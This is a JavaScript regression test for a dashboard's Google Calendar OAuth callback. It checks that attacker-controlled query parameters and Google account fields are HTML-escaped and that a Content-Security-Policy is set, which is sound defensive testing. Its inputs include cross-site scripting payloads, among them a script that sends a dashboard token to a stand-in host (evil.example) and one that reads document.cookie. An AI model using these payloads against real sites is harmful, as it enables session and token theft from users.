// Regression test: GET /api/calendar/auth/callback is unauthenticated (Google
// redirects the browser here directly, so it bypasses bearer-token auth — see
// server/src/auth.js SKIP_PREFIXES). Both the error-path (`?error=`, fully
// attacker-controlled query string) and the success-path (Google account
// email / calendar name) get interpolated into the HTML response. Anyone who
// can get a victim to click a crafted callback URL, or who controls the
// display name on the Google account being connected, must not be able to
// inject markup/script that could read `localStorage.dashboard_token`.

import { describe, it, before, after } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import net from 'node:net';
import http from 'node:http';

const ROOT = path.resolve(import.meta.dirname, '..');
const CREDS_PATH = path.join(ROOT, '.google-credentials.json');

describe('calendar OAuth callback — unauthenticated HTML response is escaped', () => {
  let server, base, tmpDir, db, originalFetch, credsWritten;

  before(async () => {
    tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'helm-calendar-auth-'));
    process.env.DASHBOARD_DB_PATH = path.join(tmpDir, 'test.db');
    process.env.HELM_DISABLE_TELEGRAM_NOTIFICATIONS = '1';

    const port = await new Promise((resolve, reject) => {
      const probe = net.createServer();
      probe.once('error', reject);
      probe.listen(0, '127.0.0.1', () => {
        const value = probe.address().port;
        probe.close(() => resolve(value));
      });
    });
    process.env.DASHBOARD_URL = `http://127.0.0.1:${port}`;

    const dbMod = await import('../server/src/db.js');
    db = dbMod.db;
    const { getToken } = await import('../server/src/auth.js');
    process.env.DASHBOARD_TOKEN = getToken();
    const { createApp } = await import('../server/src/app.js');
    server = await new Promise((resolve) => {
      const value = createApp().listen(port, '127.0.0.1', () => resolve(value));
    });
    base = `http://127.0.0.1:${port}/api`;

    // Only write the fixture creds file if the developer/CI host doesn't
    // already have a real one; never overwrite a real local file.
    credsWritten = !fs.existsSync(CREDS_PATH);
    if (credsWritten) {
      fs.writeFileSync(CREDS_PATH, JSON.stringify({
        client_id: 'test-client-id',
        client_secret: 'test-client-secret',
        redirect_uri: `http://127.0.0.1:${port}/api/calendar/auth/callback`,
      }));
    }
  });

  after(async () => {
    if (server) await new Promise((resolve) => server.close(resolve));
    if (originalFetch) globalThis.fetch = originalFetch;
    try { db?.close(); } catch {}
    if (credsWritten) { try { fs.unlinkSync(CREDS_PATH); } catch {} }
    if (tmpDir) fs.rmSync(tmpDir, { recursive: true, force: true });
    delete process.env.HELM_DISABLE_TELEGRAM_NOTIFICATIONS;
    delete process.env.DASHBOARD_TOKEN;
  });

  it('escapes a hostile ?error= value instead of reflecting it raw', async () => {
    const payload = '<script>fetch(`https://evil.example/steal?t=${localStorage.dashboard_token}`)</script>';
    const res = await fetch(`${base}/calendar/auth/callback?error=${encodeURIComponent(payload)}`);
    const text = await res.text();
    assert.equal(res.status, 400);
    assert.doesNotMatch(text, /<script>fetch/, 'raw <script> must not appear in the response HTML');
    assert.match(text, /&lt;script&gt;/, 'the hostile value must be HTML-escaped');
  });

  it('escapes hostile characters in other attacker-controlled query params too', async () => {
    // state/code are also attacker-reachable before validation fails.
    const res = await fetch(`${base}/calendar/auth/callback?code=x&state=${encodeURIComponent('"><img src=x onerror=alert(1)>')}`);
    const text = await res.text();
    assert.equal(res.status, 400);
    assert.doesNotMatch(text, /<img src=x onerror=alert\(1\)>/);
  });

  it('sets a restrictive Content-Security-Policy on the auth response', async () => {
    const res = await fetch(`${base}/calendar/auth/callback?error=x`);
    const csp = res.headers.get('content-security-policy');
    assert.ok(csp, 'callback response must set a Content-Security-Policy header');
    assert.match(csp, /default-src\s+'none'/, 'CSP should default-deny and only allow what the static auth page needs');
  });

  it('escapes hostile Google account email / calendar name on the success path', async () => {
    originalFetch = globalThis.fetch;
    const hostileEmail = '<script>alert(document.cookie)</script>@evil.example';
    const hostileCalendarName = '"><img src=x onerror=alert(1)>';
    globalThis.fetch = async (url, opts) => {
      const u = String(url);
      if (u.startsWith(base) || u.startsWith('http://127.0.0.1')) return originalFetch(url, opts);
      if (u.includes('oauth2.googleapis.com/token')) {
        return jsonResponse({ access_token: 'a', refresh_token: 'r', expires_in: 3600 });
      }
      if (u.includes('openidconnect.googleapis.com/v1/userinfo')) {
        return jsonResponse({ email: hostileEmail });
      }
      if (u.includes('/users/me/calendarList')) {
        return jsonResponse({ items: [{ id: 'primary', summary: hostileCalendarName, primary: true }] });
      }
      // Anything else (e.g. the background initial sync's events.list call)
      // — return an empty, well-formed Calendar API page.
      return jsonResponse({ items: [], nextSyncToken: 'tok' });
    };

    const location = await new Promise((resolve, reject) => {
      http.get(`${base}/calendar/auth/start`, (r) => {
        r.resume();
        resolve(r.headers.location);
      }).on('error', reject);
    });
    const state = new URL(location).searchParams.get('state');

    const res = await fetch(`${base}/calendar/auth/callback?code=fake-code&state=${state}`, { redirect: 'manual' });
    const text = await res.text();
    assert.equal(res.status, 200);
    assert.doesNotMatch(text, /<script>alert\(document\.cookie\)<\/script>/);
    assert.doesNotMatch(text, /"><img src=x onerror=alert\(1\)>/);
    assert.match(text, /&lt;script&gt;/);
  });
});

function jsonResponse(obj) {
  return new Response(JSON.stringify(obj), {
    status: 200,
    headers: { 'content-type': 'application/json' },
  });
}
